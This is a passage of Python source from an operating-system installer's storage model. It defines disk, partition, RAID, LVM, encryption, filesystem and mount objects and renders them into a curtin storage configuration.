self.original_fstype() is not None:\n                format_desc = _(\"to be reformatted as {fstype}\")\n            else:\n                format_desc = _(\"to be formatted as {fstype}\")\n            r = [format_desc.format(fstype=fs.fstype)]\n            if self._m.is_mounted_filesystem(fs.fstype):\n                m = fs.mount()\n                if m:\n                    r.append(_(\"mounted at {path}\").format(path=m.path))\n                elif getattr(self, 'flag', None) != \"boot\":\n                    r.append(_(\"not mounted\"))\n            elif fs.preserve:\n                if fs.mount() is None:\n                    r.append(_(\"unused\"))\n                else:\n                    r.append(_(\"used\"))\n            return r\n        else:\n            return [_(\"unused\")]\n\n    def _is_entirely_used(self):\n        return self._fs is not None or self._constructed_device is not None\n\n    def fs(self):\n        return self._fs\n\n    def original_fstype(self):\n        for action in self._m._orig_config:\n            if action['type'] == 'format' and action['volume'] == self.id:\n                return action['fstype']\n        for action in self._m._orig_config:\n            if action['id'] == self.id and action.get('flag') == 'swap':\n                return 'swap'\n        return None\n\n    def constructed_device(self, skip_dm_crypt=True):\n        cd = self._constructed_device\n        if cd is None:\n            return None\n        elif cd.type == \"dm_crypt\" and skip_dm_crypt:\n            return cd._constructed_device\n        else:\n            return cd\n\n    @property\n    @abstractmethod\n    def supported_actions(self):\n        pass\n\n    def action_possible(self, action):\n        assert action in self.supported_actions\n        r = getattr(self, \"_can_\" + action.name)\n        if isinstance(r, bool):\n            return r, None\n        elif isinstance(r, str):\n            return False, r\n        else:\n            return r\n\n    @property\n    @abstractmethod\n    def ok_for_raid(self):\n        pass\n\n    @property\n    @abstractmethod\n    def ok_for_lvm_vg(self):\n        pass\n\n\n# Nothing is put in the first and last megabytes of the disk to allow\n# space for the GPT data.\nGPT_OVERHEAD = 2 * (1 << 20)\n\n\n@attr.s(cmp=False)\nclass _Device(_Formattable, ABC):\n    # Anything that can have partitions, e.g. a disk or a RAID.\n\n    @property\n    @abstractmethod\n    def size(self):\n        pass\n\n    # [Partition]\n    _partitions = attributes.backlink(default=attr.Factory(list))\n\n    def dasd(self):\n        return None\n\n    def ptable_for_new_partition(self):\n        if self.ptable is not None:\n            return self.ptable\n        for action in self._m._orig_config:\n            if action['id'] == self.id:\n                if action.get('ptable') == 'vtoc':\n                    return action['ptable']\n        if self.dasd() is not None:\n            return 'vtoc'\n        return 'gpt'\n\n    def partitions(self):\n        return self._partitions\n\n    @property\n    def used(self):\n        if self._is_entirely_used():\n            return self.size\n        r = 0\n        for p in self._partitions:\n            if p.flag == \"extended\":\n                continue\n            r += p.size\n        return r\n\n    @property\n    def empty(self):\n        return self.used == 0\n\n    @property\n    def available_for_partitions(self):\n        return self.size - GPT_OVERHEAD\n\n    @property\n    def free_for_partitions(self):\n        return self.available_for_partitions - self.used\n\n    def available(self):\n        # A _Device is available if:\n        # 1) it is not part of a device like a RAID or LVM or zpool or ...\n        # 2) if it is formatted, it is available if it is formatted with fs\n        #    that needs to be mounted and is not mounted\n        # 3) if it is not formatted, it is available if it has free\n        #    space OR at least one partition is not formatted or is formatted\n        #    with a fs that needs to be mounted and is not mounted\n        if self._constructed_device is not None:\n            return False\n        if self._fs is not None:\n            return self._fs._available()\n        if self.free_for_partitions > 0:\n            if not self._has_preexisting_partition():\n                return True\n        for p in self._partitions:\n            if p.available():\n                return True\n        return False\n\n    def has_unavailable_partition(self):\n        for p in self._partitions:\n            if not p.available():\n                return True\n        return False\n\n    def _has_preexisting_partition(self):\n        for p in self._partitions:\n            if p.preserve:\n                return True\n        else:\n            return False\n\n    @property\n    def _can_DELETE(self):\n        mounted_partitions = 0\n        for p in self._partitions:\n            if p.fs() and p.fs().mount():\n                mounted_partitions += 1\n            elif p.constructed_device():\n                cd = p.constructed_device()\n                return _(\n                    \"Cannot delete {selflabel} as partition {partnum} is part \"\n                    \"of the {cdtype} {cdname}.\").format(\n                        selflabel=self.label,\n                        partnum=p._number,\n                        cdtype=cd.desc(),\n                        cdname=cd.label,\n                        )\n        if mounted_partitions > 1:\n            return _(\n                \"Cannot delete {selflabel} because it has {count} mounted \"\n                \"partitions.\").format(\n                    selflabel=self.label,\n                    count=mounted_partitions)\n        elif mounted_partitions == 1:\n            return _(\n                \"Cannot delete {selflabel} because it has 1 mounted partition.\"\n                ).format(selflabel=self.label)\n        else:\n            return _generic_can_DELETE(self)\n\n\n@fsobj(\"dasd\")\nclass Dasd:\n    device_id = attr.ib()\n    blocksize = attr.ib()\n    disk_layout = attr.ib()\n    label = attr.ib(default=None)\n    mode = attr.ib(default=None)\n    preserve = attr.ib(default=False)\n\n\n@fsobj(\"disk\")\nclass Disk(_Device):\n    ptable = attributes.ptable()\n    serial = attr.ib(default=None)\n    wwn = attr.ib(default=None)\n    multipath = attr.ib(default=None)\n    path = attr.ib(default=None)\n    model = attr.ib(default=None)\n    wipe = attr.ib(default=None)\n    preserve = attr.ib(default=False)\n    name = attr.ib(default=\"\")\n    grub_device = attr.ib(default=False)\n    device_id = attr.ib(default=None)\n\n    _info = attr.ib(default=None)\n\n    def info_for_display(self):\n        bus = self._info.raw.get('ID_BUS', None)\n        major = self._info.raw.get('MAJOR', None)\n        if bus is None and major == '253':\n            bus = 'virtio'\n\n        devpath = self._info.raw.get('DEVPATH', self.path)\n        # XXX probert should be doing this!!\n        rotational = '1'\n        try:\n            dev = os.path.basename(devpath)\n            rfile = '/sys/class/block/{}/queue/rotational'.format(dev)\n            rotational = open(rfile, 'r').read().strip()\n        except (PermissionError, FileNotFoundError, IOError):\n            log.exception('WARNING: Failed to read file {}'.format(rfile))\n            pass\n\n        dinfo = {\n            'bus': bus,\n            'devname': self.path,\n            'devpath': devpath,\n            'model': self.model or 'unknown',\n            'serial': self.serial or 'unknown',\n            'wwn': self.wwn or 'unknown',\n            'multipath': self.multipath or 'unknown',\n            'size': self.size,\n            'humansize': humanize_size(self.size),\n            'vendor': self._info.vendor or 'unknown',\n            'rotational': 'true' if rotational == '1' else 'false',\n        }\n        return dinfo\n\n    @property\n    def size(self):\n        return align_down(self._info.size)\n\n    @property\n    def annotations(self):\n        return []\n\n    def desc(self):\n        if self.multipath:\n            return _(\"multipath device\")\n        return _(\"local disk\")\n\n    @property\n    def label(self):\n        if self.multipath:\n            return self.wwn\n        return self.serial or self.path\n\n    def dasd(self):\n        return self._m._one(type='dasd', device_id=self.device_id)\n\n    def _can_be_boot_disk(self):\n        bl = self._m.bootloader\n        if self._has_preexisting_partition():\n            if bl == Bootloader.BIOS:\n                if self.ptable == \"msdos\":\n                    return True\n                else:\n                    return self._partitions[0].flag == \"bios_grub\"\n            else:\n                flag = {Bootloader.UEFI: \"boot\", Bootloader.PREP: \"prep\"}[bl]\n                for p in self._partitions:\n                    if p.flag == flag:\n                        return True\n                return False\n        else:\n            return True\n\n    @property\n    def supported_actions(self):\n        actions = [\n            DeviceAction.INFO,\n            DeviceAction.REFORMAT,\n            DeviceAction.PARTITION,\n            DeviceAction.FORMAT,\n            DeviceAction.REMOVE,\n            ]\n        if self._m.bootloader != Bootloader.NONE:\n            actions.append(DeviceAction.TOGGLE_BOOT)\n        return actions\n\n    _can_INFO = True\n\n    @property\n    def _can_REFORMAT(self):\n        if len(self._partitions) == 0:\n            return False\n        for p in self._partitions:\n            if p._constructed_device is not None:\n                return False\n        return True\n\n    @property\n    def _can_PARTITION(self):\n        if self._has_preexisting_partition():\n            return False\n        if self.free_for_partitions <= 0:\n            return False\n        if self.ptable == 'vtoc' and len(self._partitions) >= 3:\n            return False\n        return True\n\n    _can_FORMAT = property(\n        lambda self: len(self._partitions) == 0 and\n        self._constructed_device is None)\n    _can_REMOVE = property(_generic_can_REMOVE)\n\n    def _is_boot_device(self):\n        bl = self._m.bootloader\n        if bl == Bootloader.NONE:\n            return False\n        elif bl == Bootloader.BIOS:\n            return self.grub_device\n        elif bl in [Bootloader.PREP, Bootloader.UEFI]:\n            for p in self._partitions:\n                if p.grub_device:\n                    return True\n            return False\n\n    @property\n    def _can_TOGGLE_BOOT(self):\n        if self._is_boot_device():\n            for disk in self._m.all_disks():\n                if disk is not self and disk._is_boot_device():\n                    return True\n            return False\n        elif self._fs is not None or self._constructed_device is not None:\n            return False\n        else:\n            return self._can_be_boot_disk()\n\n    @property\n    def ok_for_raid(self):\n        if self._fs is not None:\n            if self._fs.preserve:\n                return self._fs._mount is None\n            return False\n        if self._constructed_device is not None:\n            return False\n        if len(self._partitions) > 0:\n            return False\n        return True\n\n    ok_for_lvm_vg = ok_for_raid\n\n\n@fsobj(\"partition\")\nclass Partition(_Formattable):\n    device = attributes.ref(backlink=\"_partitions\")  # Disk\n    size = attributes.size()\n\n    wipe = attr.ib(default=None)\n    flag = attr.ib(default=None)\n    number = attr.ib(default=None)\n    preserve = attr.ib(default=False)\n    grub_device = attr.ib(default=False)\n\n    @property\n    def annotations(self):\n        r = super().annotations\n        if self.flag == \"prep\":\n            r.append(\"PReP\")\n            if self.preserve:\n                if self.grub_device:\n                    r.append(_(\"configured\"))\n                else:\n                    r.append(_(\"unconfigured\"))\n        elif self.flag == \"boot\":\n            if self.fs() and self.fs().mount():\n                r.append(_(\"primary ESP\"))\n            elif self.grub_device:\n                r.append(_(\"backup ESP\"))\n            else:\n                r.append(_(\"unused ESP\"))\n        elif self.flag == \"bios_grub\":\n            if self.preserve:\n                if self.device.grub_device:\n                    r.append(_(\"configured\"))\n                else:\n                    r.append(_(\"unconfigured\"))\n            r.append(\"bios_grub\")\n        elif self.flag == \"extended\":\n            r.append(_(\"extended\"))\n        elif self.flag == \"logical\":\n            r.append(_(\"logical\"))\n        return r\n\n    def usage_labels(self):\n        if self.flag == \"prep\" or self.flag == \"bios_grub\":\n            return []\n        return super().usage_labels()\n\n    def desc(self):\n        return _(\"partition of {device}\").format(device=self.device.desc())\n\n    @property\n    def label(self):\n        return _(\"partition {number} of {device}\").format(\n            number=self._number, device=self.device.label)\n\n    @property\n    def short_label(self):\n        return _(\"partition {number}\").format(number=self._number)\n\n    def available(self):\n        if self.flag in ['bios_grub', 'prep'] or self.grub_device:\n            return False\n        if self._constructed_device is not None:\n            return False\n        if self._fs is None:\n            return True\n        return self._fs._available()\n\n    def serialize_number(self):\n        return {'number': self._number}\n\n    @property\n    def _number(self):\n        if self.preserve:\n            return self.number\n        else:\n            return self.device._partitions.index(self) + 1\n\n    supported_actions = [\n        DeviceAction.EDIT,\n        DeviceAction.REMOVE,\n        DeviceAction.DELETE,\n        ]\n\n    _can_EDIT = property(_generic_can_EDIT)\n\n    _can_REMOVE = property(_generic_can_REMOVE)\n\n    @property\n    def _can_DELETE(self):\n        if self.device._has_preexisting_partition():\n            return _(\"Cannot delete a single partition from a device that \"\n                     \"already has partitions.\")\n        if self.flag in ('boot', 'bios_grub', 'prep'):\n            return _(\"Cannot delete required bootloader partition\")\n        return _generic_can_DELETE(self)\n\n    @property\n    def ok_for_raid(self):\n        if self.flag in ('boot', 'bios_grub', 'prep'):\n            return False\n        if self._fs is not None:\n            if self._fs.preserve:\n                return self._fs._mount is None\n            return False\n        if self._constructed_device is not None:\n            return False\n        return True\n\n    ok_for_lvm_vg = ok_for_raid\n\n\n@fsobj(\"raid\")\nclass Raid(_Device):\n    name = attr.ib()\n    raidlevel = attr.ib(converter=lambda x: raidlevels_by_value[x].value)\n    devices = attributes.reflist(backlink=\"_constructed_device\")\n\n    def serialize_devices(self):\n        # Surprisingly, the order of devices passed to mdadm --create\n        # matters (see get_raid_size) so we sort devices here the same\n        # way get_raid_size does.\n        return {'devices': [d.id for d in raid_device_sort(self.devices)]}\n\n    spare_devices = attributes.reflist(\n        backlink=\"_constructed_device\", default=attr.Factory(set))\n\n    preserve = attr.ib(default=False)\n    ptable = attributes.ptable()\n\n    @property\n    def size(self):\n        return get_raid_size(self.raidlevel, self.devices)\n\n    @property\n    def available_for_partitions(self):\n        # For some reason, the overhead on RAID devices seems to be\n        # higher (may be related to alignment of underlying\n        # partitions)\n        return self.size - 2*GPT_OVERHEAD\n\n    @property\n    def label(self):\n        return self.name\n\n    def desc(self):\n        return _(\"software RAID {level}\").format(level=self.raidlevel[4:])\n\n    supported_actions = [\n        DeviceAction.EDIT,\n        DeviceAction.PARTITION,\n        DeviceAction.FORMAT,\n        DeviceAction.REMOVE,\n        DeviceAction.DELETE,\n        DeviceAction.REFORMAT,\n        ]\n\n    @property\n    def _can_EDIT(self):\n        if self.preserve:\n            return _(\"Cannot edit pre-existing RAIDs.\")\n        elif len(self._partitions) > 0:\n            return _(\n                \"Cannot edit {selflabel} because it has partitions.\").format(\n                    selflabel=self.label)\n        else:\n            return _generic_can_EDIT(self)\n\n    _can_PARTITION = Disk._can_PARTITION\n    _can_REFORMAT = Disk._can_REFORMAT\n    _can_FORMAT = property(\n        lambda self: len(self._partitions) == 0 and\n        self._constructed_device is None)\n    _can_REMOVE = property(_generic_can_REMOVE)\n\n    @property\n    def ok_for_raid(self):\n        if self._fs is not None:\n            if self._fs.preserve:\n                return self._fs._mount is None\n            return False\n        if self._constructed_device is not None:\n            return False\n        if len(self._partitions) > 0:\n            return False\n        return True\n\n    ok_for_lvm_vg = ok_for_raid\n\n    # What is a device that makes up this device referred to as?\n    component_name = \"component\"\n\n\n@fsobj(\"lvm_volgroup\")\nclass LVM_VolGroup(_Device):\n    name = attr.ib()\n    devices = attributes.reflist(backlink=\"_constructed_device\")\n\n    preserve = attr.ib(default=False)\n\n    @property\n    def size(self):\n        # Should probably query actual size somehow for an existing VG!\n        return get_lvm_size(self.devices)\n\n    @property\n    def available_for_partitions(self):\n        return self.size\n\n    @property\n    def annotations(self):\n        r = super().annotations\n        member = next(iter(self.devices))\n        if member.type == \"dm_crypt\":\n            r.append(_(\"encrypted\"))\n        return r\n\n    @property\n    def label(self):\n        return self.name\n\n    def desc(self):\n        return _(\"LVM volume group\")\n\n    supported_actions = [\n        DeviceAction.EDIT,\n        DeviceAction.CREATE_LV,\n        DeviceAction.DELETE,\n        ]\n\n    @property\n    def _can_EDIT(self):\n        if self.preserve:\n            return _(\"Cannot edit pre-existing volume groups.\")\n        elif len(self._partitions) > 0:\n            return _(\n                \"Cannot edit {selflabel} because it has logical \"\n                \"volumes.\").format(\n                    selflabel=self.label)\n        else:\n            return _generic_can_EDIT(self)\n\n    _can_CREATE_LV = property(\n        lambda self: not self.preserve and self.free_for_partitions > 0)\n\n    ok_for_raid = False\n    ok_for_lvm_vg = False\n\n    # What is a device that makes up this device referred to as?\n    component_name = \"PV\"\n\n\n@fsobj(\"lvm_partition\")\nclass LVM_LogicalVolume(_Formattable):\n    name = attr.ib()\n    volgroup = attributes.ref(backlink=\"_partitions\")  # LVM_VolGroup\n    size = attributes.size()\n\n    preserve = attr.ib(default=False)\n\n    def serialize_size(self):\n        return {'size': \"{}B\".format(self.size)}\n\n    def available(self):\n        if self._constructed_device is not None:\n            return False\n        if self._fs is None:\n            return True\n        return self._fs._available()\n\n    @property\n    def flag(self):\n        return None  # hack!\n\n    def desc(self):\n        return _(\"LVM logical volume\")\n\n    @property\n    def short_label(self):\n        return self.name\n\n    label = short_label\n\n    supported_actions = [\n        DeviceAction.EDIT,\n        DeviceAction.DELETE,\n        ]\n\n    _can_EDIT = True\n\n    @property\n    def _can_DELETE(self):\n        if self.volgroup._has_preexisting_partition():\n            return _(\"Cannot delete a single logical volume from a volume \"\n                     \"group that already has logical volumes.\")\n        return True\n\n    ok_for_raid = False\n    ok_for_lvm_vg = False\n\n\nLUKS_OVERHEAD = 16*(2**20)\n\n\n@fsobj(\"dm_crypt\")\nclass DM_Crypt:\n    volume = attributes.ref(backlink=\"_constructed_device\")  # _Formattable\n    key = attr.ib(metadata={'redact': True})\n\n    dm_name = attr.ib(default=None)\n    preserve = attr.ib(default=False)\n\n    _constructed_device = attributes.backlink()\n\n    def constructed_device(self):\n        return self._constructed_device\n\n    @property\n    def size(self):\n        return self.volume.size - LUKS_OVERHEAD\n\n\n@fsobj(\"format\")\nclass Filesystem:\n    fstype = attr.ib()\n    volume = attributes.ref(backlink=\"_fs\")  # _Formattable\n\n    label = attr.ib(default=None)\n    uuid = attr.ib(default=None)\n    preserve = attr.ib(default=False)\n\n    _mount = attributes.backlink()\n\n    def mount(self):\n        return self._mount\n\n    def _available(self):\n        # False if mounted or if fs does not require a mount, True otherwise.\n        if self._mount is None:\n            if self.preserve:\n                return True\n            else:\n                return FilesystemModel.is_mounted_filesystem(self.fstype)\n        else:\n            return False\n\n\n@fsobj(\"mount\")\nclass Mount:\n    device = attributes.ref(backlink=\"_mount\")  # Filesystem\n    path = attr.ib()\n\n    def can_delete(self):\n        # Can't delete mount of /boot/efi or swap, anything else is fine.\n        if not self.path:\n            # swap mount\n            return False\n        if not isinstance(self.device.volume, Partition):\n            # Can't be /boot/efi if volume is not a partition\n            return True\n        if self.device.volume.flag == \"boot\":\n            # /boot/efi\n            return False\n        return True\n\n\ndef align_up(size, block_size=1 << 20):\n    return (size + block_size - 1) & ~(block_size - 1)\n\n\ndef align_down(size, block_size=1 << 20):\n    return size & ~(block_size - 1)\n\n\nclass Bootloader(enum.Enum):\n    NONE = \"NONE\"  # a system where the bootloader is external, e.g. s390x\n    BIOS = \"BIOS\"  # BIOS, where the bootloader dd-ed to the start of a device\n    UEFI = \"UEFI\"  # UEFI, ESPs and /boot/efi and all that (amd64 and arm64)\n    PREP = \"PREP\"  # ppc64el, which puts grub on a PReP partition\n\n\nclass FilesystemModel(object):\n\n    lower_size_limit = 128 * (1 << 20)\n\n    target = None\n\n    @classmethod\n    def is_mounted_filesystem(self, fstype):\n        if fstype in [None, 'swap']:\n            return False\n        else:\n            return True\n\n    def _probe_bootloader(self):\n        # This will at some point change to return a list so that we can\n        # configure BIOS _and_ UEFI on amd64 systems.\n        if os.path.exists('/sys/firmware/efi'):\n            return Bootloader.UEFI\n        elif platform.machine().startswith(\"ppc64\"):\n            return Bootloader.PREP\n        elif platform.machine() == \"s390x\":\n            return Bootloader.NONE\n        else:\n            return Bootloader.BIOS\n\n    def __init__(self):\n        self.bootloader = self._probe_bootloader()\n        self._probe_data = None\n        self.reset()\n\n    def reset(self):\n        if self._probe_data is not None:\n            self._orig_config = storage_config.extract_storage_config(\n                self._probe_data)[\"storage\"][\"config\"]\n            self._actions = self._actions_from_config(\n                self._orig_config, self._probe_data['blockdev'])\n        else:\n            self._orig_config = []\n            self._actions = []\n        self.swap = None\n        self.grub = None\n\n    def _make_matchers(self, match):\n        matchers = []\n\n        def match_serial(disk):\n            if disk.serial is not None:\n                return fnmatch.fnmatchcase(disk.serial, match['serial'])\n\n        def match_model(disk):\n            if disk.model is not None:\n                return fnmatch.fnmatchcase(disk.model, match['model'])\n\n        def match_path(disk):\n            if disk.path is not None:\n                return fnmatch.fnmatchcase(disk.path, match['path'])\n\n        def match_ssd(disk):\n            is_ssd = disk.info_for_display()['rotational'] == 'false'\n            return is_ssd == match['ssd']\n\n        if 'serial' in match:\n            matchers.append(match_serial)\n        if 'model' in match:\n            matchers.append(match_model)\n        if 'path' in match:\n            matchers.append(match_path)\n        if 'ssd' in match:\n            matchers.append(match_ssd)\n\n        return matchers\n\n    def disk_for_match(self, disks, match):\n        matchers = self._make_matchers(match)\n        candidates = []\n        for candidate in disks:\n            for matcher in matchers:\n                if not matcher(candidate):\n                    break\n            else:\n                candidates.append(candidate)\n        if match.get('size') == 'largest':\n            candidates.sort(key=lambda d: d.size, reverse=True)\n        if candidates:\n            return candidates[0]\n        return None\n\n    def apply_autoinstall_config(self, ai_config):\n        disks = self.all_disks()\n        for action in ai_config:\n            if action['type'] == 'disk':\n                disk = None\n                if 'serial' in action:\n                    disk = self._one(type='disk', serial=action['serial'])\n                elif 'path' in action:\n                    disk = self._one(type='disk', path=action['path'])\n                else:\n                    match = action.pop('match', {})\n                    disk = self.disk_for_match(disks, match)\n                    if disk is None:\n                        action['match'] = match\n                if disk is None:\n                    raise Exception(\"{} matched no disk\".format(action))\n                if disk not in disks:\n                    raise Exception(\n                        \"{} matched {} which was already used\".format(\n                            action, disk))\n                disks.remove(disk)\n                action['path'] = disk.path\n                action['serial'] = disk.serial\n        self._actions = self._actions_from_config(\n            ai_config, self._probe_data['blockdev'], is_autoinstall=True)\n        for p in self._all(type=\"partition\") + self._all(type=\"lvm_partition\"):\n            [parent] = list(dependencies(p))\n            if isinstance(p.size, int):\n                if p.size < 0:\n                    if p is not parent.partitions()[-1]:\n                        raise Exception(\n                            \"{} has negative size but is not final partition \"\n                            \"of {}\".format(p, parent))\n                    p.size = 0\n                    p.size = parent.free_for_partitions\n            elif isinstance(p.size, str):\n                if p.size.endswith(\"%\"):\n                    percentage = int(p.size[:-1])\n                    p.size = align_down(\n                        parent.available_for_partitions*percentage//100)\n                else:\n                    p.size = dehumanize_size(p.size)\n\n    def _actions_from_config(self, config, blockdevs, is_autoinstall=False):\n        \"\"\"Convert curtin storage config into action instances.\n\n        curtin represents storage \"actions\" as defined in\n        https://curtin.readthedocs.io/en/latest/topics/storage.html.  We\n        convert each action (that we know about) into an instance of\n        Disk, Partition, RAID, etc (unknown actions, e.g. bcache, are\n        just ignored).\n\n        We also filter out anything that can be reached from a currently\n        mounted device. The motivation here is only to exclude the media\n        subiquity is mounted from, so this might be a bit excessive but\n        hey it works.\n\n        Perhaps surprisingly the order of the returned actions matters.\n        The devices are presented in the filesystem view in the reverse\n        of the order they appear in _actions, which means that e.g. a\n        RAID appears higher up the list than the disks is is composed\n        of. This is quite important as it makes \"unpeeling\" existing\n        compound structures easy, you just delete the top device until\n        you only have disks left.\n        \"\"\"\n        byid = {}\n        objs = []\n        exclusions = set()\n        seen_multipaths = set()\n        for action in config:\n            if not is_autoinstall and action['type'] == 'mount':\n                if not action['path'].startswith(self.target):\n                    # Completely ignore mounts under /target, they are\n                    # probably leftovers from a previous install\n                    # attempt.\n                    exclusions.add(byid[action['device']])\n                continue\n            c = _type_to_cls.get(action['type'], None)\n            if c is None:\n                # Ignore any action we do not know how to process yet\n                # (e.g. bcache)\n                continue\n            kw = {}\n            for f in attr.fields(c):\n                n = f.name\n                if n not in action:\n                    continue\n                v = action[n]\n                try:\n                    if f.metadata.get('ref', False):\n                        kw[n] = byid[v]\n                    elif f.metadata.get('reflist', False):\n                        kw[n] = [byid[id] for id in v]\n                    else:\n                        kw[n] = v\n                except KeyError:\n                    # If a dependency of the current action has been\n                    # ignored, we need to ignore the current action too\n                    # (e.g. a bcache's filesystem).\n                    continue\n            if kw['type'] == 'disk':\n                path = kw['path']\n                kw['info'] = StorageInfo({path: blockdevs[path]})\n            if not is_autoinstall:\n                kw['preserve'] = True\n            obj = byid[action['id']] = c(m=self, **kw)\n            multipath = kw.get('multipath')\n            if multipath:\n                if multipath in seen_multipaths:\n                    exclusions.add(obj)\n                else:\n                    seen_multipaths.add(multipath)\n            objs.append(obj)\n\n        while True:\n            next_exclusions = exclusions.copy()\n            for e in exclusions:\n                next_exclusions.update(itertools.chain(\n                    dependencies(e), reverse_dependencies(e)))\n            if len(exclusions) == len(next_exclusions):\n                break\n            exclusions = next_exclusions\n\n        log.debug(\"exclusions %s\", {e.id for e in exclusions})\n\n        objs = [o for o in objs if o not in exclusions]\n\n        if not is_autoinstall:\n            for o in objs:\n                if o.type == \"partition\" and o.flag == \"swap\":\n                    if o._fs is None:\n                        objs.append(Filesystem(\n                            m=self, fstype=\"swap\", volume=o, preserve=True))\n\n        return objs\n\n    def _render_actions(self):\n        # The curtin storage config has the constraint that an action must be\n        # preceded by all the things that it depends on.  We handle this by\n        # repeatedly iterating over all actions and checking if we can emit\n        # each action by checking if all of the actions it depends on have been\n        # emitted.  Eventually this will either emit all actions or stop making\n        # progress -- which means there is a cycle in the definitions,\n        # something the UI should have prevented <wink>.\n        r = []\n        emitted_ids = set()\n\n        def emit(obj):\n            if isinstance(obj, Raid):\n                log.debug(\n                    \"FilesystemModel: estimated size of %s %s is %s\",\n                    obj.raidlevel, obj.name, obj.size)\n            r.append(asdict(obj))\n            emitted_ids.add(obj.id)\n\n        def ensure_partitions(dev):\n            for part in dev.partitions():\n                if part.id not in emitted_ids:\n                    if part not in work and part not in next_work:\n                        next_work.append(part)\n\n        def can_emit(obj):\n            if obj.type == \"partition\":\n                ensure_partitions(obj.device)\n                for p in obj.device.partitions():\n                    if p._number < obj._number and p.id not in emitted_ids:\n                        return False\n            for dep in dependencies(obj):\n                if dep.id not in emitted_ids:\n                    if dep not in work and dep not in next_work:\n                        next_work.append(dep)\n                        if dep.type in ['disk', 'raid']:\n                            ensure_partitions(dep)\n                    return False\n            if isinstance(obj, Mount):\n                # Any mount actions for a parent of this one have to be emitted\n                # first.\n                for parent in pathlib.Path(obj.path).parents:\n                    parent = str(parent)\n                    if parent in mountpoints:\n                        if mountpoints[parent] not in emitted_ids:\n                            log.debug(\n                                \"cannot emit action to mount %s until that \"\n                                \"for %s is emitted\", obj.path, parent)\n                            return False\n            return True\n\n        mountpoints = {m.path: m.id for m in self.all_mounts()}\n        log.debug('mountpoints %s', mountpoints)\n\n        work = [\n            a for a in self._actions\n            if not getattr(a, 'preserve', False)\n            ]\n\n        while work:\n            next_work = []\n            for obj in work:\n                if can_emit(obj):\n                    emit(obj)\n                else:\n                    next_work.append(obj)\n            if {a.id for a in next_work} == {a.id for a in work}:\n                msg = [\"rendering block devices made no progress processing:\"]\n                for w in work:\n                    msg.append(\" - \" + str(w))\n                raise Exception(\"\\n\".join(msg))\n            work = next_work\n\n        return r\n\n    def render(self):\n        config = {\n            'storage': {\n                'version': 1,\n                'config': self._render_actions(),\n                },\n            }\n        if self.swap is not None:\n            config['swap'] = self.swap\n        if self.grub is not None:\n            config['grub'] = self.grub\n        return config\n\n    def load_probe_data(self, probe_data):\n        self._probe_data = probe_data\n        self.reset()\n\n    def _matcher(self, type, kw):\n        for a in self._actions:\n            if a.type != type:\n                continue\n            for k, v in kw.items():\n                if getattr(a, k) != v:\n                    break\n            else:\n                yield a\n\n    def _one(self, *, type, **kw):\n        try:\n            return next(self._matcher(type, kw))\n        except StopIteration:\n            return None\n\n    def _all(self, *, type, **kw):\n        return list(self._matcher(type, kw))\n\n    def all_mounts(self):\n        return self._all(type='mount')\n\n    def all_devices(self):\n        # return:\n        #  compound devices, newest first\n        #  disk devices, sorted by label\n        disks = []\n        compounds = []\n        for a in self._actions:\n            if a.type == 'disk':\n                disks.append(a)\n            elif isinstance(a, _Device):\n                compounds.append(a)\n        compounds.reverse()\n        disks.sort(key=lambda x: x.label)\n        return compounds + disks\n\n    def all_disks(self):\n        return sorted(self._all(type='disk'), key=lambda x: x.label)\n\n    def all_raids(self):\n        return self._all(type='raid')\n\n    def all_volgroups(self):\n        return self._all(type='lvm_volgroup')\n\n    def _remove(self, obj):\n        _remove_backlinks(obj)\n        self._actions.remove(obj)\n\n    def add_partition(self, device, size, flag=\"\", wipe=None,\n                      grub_device=None):\n        if size > device.free_for_partitions:\n            raise Exception(\"%s > %s\", size, device.free_for_partitions)\n        real_size = align_up(size)\n        log.debug(\"add_partition: rounded size from %s to %s\", size, real_size)\n        if device._fs is not None:\n            raise Exception(\"%s is already formatted\" % (device.label,))\n        p = Partition(\n            m=self, device=device, size=real_size, flag=flag, wipe=wipe,\n            grub_device=grub_device)\n        if flag in (\"boot\", \"bios_grub\", \"prep\"):\n            device._partitions.insert(0, device._partitions.pop())\n        device.ptable = device.ptable_for_new_partition()\n        dasd = device.dasd()\n        if dasd is not None:\n            dasd.device_layout = 'cdl'\n            dasd.preserve = False\n        self._actions.append(p)\n        return p\n\n    def remove_partition(self, part):\n        if part._fs or part._constructed_device:\n            raise Exception(\"can only remove empty partition\")\n        self._remove(part)\n        if len(part.device._partitions) == 0:\n            part.device.ptable = None\n\n    def add_raid(self, name, raidlevel, devices, spare_devices):\n        r = Raid(\n            m=self,\n            name=name,\n            raidlevel=raidlevel,\n            devices=devices,\n            spare_devices=spare_devices)\n        self._actions.append(r)\n        return r\n\n    def remove_raid(self, raid):\n        if raid._fs or raid._constructed_device or len(raid.partitions()):\n            raise Exception(\"can only remove empty RAID\")\n        self._remove(raid)\n\n    def add_volgroup(self, name, devices):\n        vg = LVM_VolGroup(m=self, name=name, devices=devices)\n        self._actions.append(vg)\n        return vg\n\n    def remove_volgroup(self, vg):\n        if len(vg._partitions):\n            raise Exception(\"can only remove empty VG\")\n        self._remove(vg)\n\n    def add_logical_volume(self, vg, name, size):\n        lv = LVM_LogicalVolume(m=self, volgroup=vg, name=name, size=size)\n        self._actions.append(lv)\n        return lv\n\n    def remove_logical_volume(self, lv):\n        if lv._fs:\n            raise Exception(\"can only remove empty LV\")\n        self._remove(lv)\n\n    def add_dm_crypt(self, volume, key):\n        if not volume.available:\n            raise Exception(\"{} is not available\".format(volume))\n        dm_crypt = DM_Crypt(volume=volume, key=key)\n        self._actions.append(dm_crypt)\n        return dm_crypt\n\n    def remove_dm_crypt(self, dm_crypt):\n        self._remove(dm_crypt)\n\n    def add_filesystem(self, volume, fstype, preserve=False):\n        log.debug(\"adding %s to %s\", fstype, volume)\n        if not volume.available:\n            if not isinstance(volume, Partition):\n                if (volume.flag == 'prep' or (\n                        volume.flag == 'bios_grub' and fstype == 'fat32')):\n                    raise Exception(\"{} is not available\".format(volume))\n        if volume._fs is not None:\n            raise Exception(\"%s is already formatted\")\n        fs = Filesystem(\n            m=self, volume=volume, fstype=fstype, preserve=preserve)\n        self._actions.append(fs)\n        return fs\n\n    def remove_filesystem(self, fs):\n        if fs._mount:\n            raise Exception(\"can only remove unmounted filesystem\")\n        self._remove(fs)\n\n    def add_mount(self, fs, path):\n        if fs._mount is not None:\n            raise Exception(\"%s is already mounted\")\n        m = Mount(m=self, device=fs, path=path)\n        self._actions.append(m)\n        # Adding a swap partition or mounting btrfs at / suppresses\n        # the swapfile.\n        if not self._should_add_swapfile():\n            self.swap = {'swap': 0}\n        return m\n\n    def remove_mount(self, mount):\n        